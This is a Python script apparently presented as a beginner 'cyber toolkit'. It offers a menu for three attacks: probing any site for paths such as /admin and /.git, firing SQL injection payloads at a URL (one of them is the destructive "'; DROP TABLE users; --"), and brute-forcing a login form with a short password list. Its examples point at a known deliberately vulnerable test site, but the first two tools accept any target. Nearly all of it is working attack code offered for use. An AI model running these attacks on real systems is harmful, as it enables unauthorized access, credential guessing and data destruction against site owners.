import requests
from colorama import init, Fore

init(autoreset=True)

def path_scanner():
    url = input("\nEnter website URL (with http:// or https://): ")
    paths = ["/admin", "/login", "/config", "/.git", "/robots.txt", "/dashboard", "/hidden", "/server-status"]
    found_urls = []

    print("\n[+] Scanning for hidden paths...\n")

    for path in paths:
        full_url = url + path
        try:
            response = requests.get(full_url, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[FOUND] {full_url}")
                found_urls.append(full_url)
            else:
                print(Fore.RED + f"[NOT FOUND] {full_url} - {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[ERROR] {full_url} - {e}")

    if found_urls:
        with open("found.txt", "w") as file:
            for url in found_urls:
                file.write(url + "\n")
        print(Fore.CYAN + "\nSaved found URLs to found.txt")
    else:
        print(Fore.CYAN + "\nNo URLs found.")

def sql_injection_tester():
    url = input("\nEnter vulnerable URL (e.g. http://testphp.vulnweb.com/artists.php?artist=): ")
    payloads = ["'", "' OR '1'='1", "' --", "'; DROP TABLE users; --"]

    print("\n[+] Testing for SQL Injection...\n")

    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url, timeout=5)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(Fore.RED + f"[⚠️ VULNERABLE] {full_url}")
            else:
                print(Fore.GREEN + f"[SAFE] {full_url}")
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[ERROR] {full_url} - {e}")

def brute_force_login():
    url = "http://testphp.vulnweb.com/login.php"
    passwords = ["admin", "1234", "password", "letmein", "admin123"]
    username = "test"

    print("\n[+] Starting brute force attack...\n")

    for pwd in passwords:
        data = {
            "uname": username,
            "pass": pwd,
            "login": "submit"
        }

        try:
            response = requests.post(url, data=data, timeout=5)
            if "Invalid credentials" not in response.text:
                print(Fore.GREEN + f"[✅ SUCCESS] Username: {username}, Password: {pwd}")
                return
            else:
                print(Fore.RED + f"[❌ FAILED] {pwd}")
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[ERROR] {e}")

    print(Fore.CYAN + "\nBrute force completed. No match found.")

def main():
    while True:
        print("\n=== CYBER TOOLKIT ===")
        print("1. Scan Website for Hidden Paths")
        print("2. Test for SQL Injection")
        print("3. Brute Force Login")
        print("4. Exit")

        choice = input("\nChoose an option (1-4): ")

        if choice == '1':
            path_scanner()
        elif choice == '2':
            sql_injection_tester()
        elif choice == '3':
            brute_force_login()
        elif choice == '4':
            print("Goodbye!")
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()
